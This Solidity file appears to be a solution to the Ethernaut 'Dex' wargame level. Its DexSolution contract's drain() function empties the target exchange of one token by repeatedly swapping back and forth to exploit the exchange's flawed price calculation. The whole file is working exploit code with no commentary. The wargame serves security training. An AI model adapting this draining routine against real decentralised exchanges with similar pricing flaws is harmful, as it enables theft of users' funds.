// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import '../ethernaut/levels/Dex.sol';

contract DexSolution {
  Dex target;
  constructor(address targetAddress) {
    target = Dex(targetAddress);
  }

  function drain() public {
    target.approve(address(target), type(uint256).max);
    IERC20 token1 = IERC20(target.token1());
    IERC20 token2 = IERC20(target.token2());
    token1.transfer(address(target), token1.balanceOf(address(this)));
    (IERC20 from, IERC20 to) = (token2, token1);
    do {
      uint amount = from.balanceOf(address(this));
      uint targetToBalance = to.balanceOf(address(target));
      if (target.getSwapPrice(address(from), address(to), amount) > targetToBalance) {
        amount = target.getSwapPrice(address(to), address(from), targetToBalance);
      }
      target.swap(address(from), address(to), amount);
      (from, to) = (to, from);
    } while (from.balanceOf(address(target)) > 0);
  }
}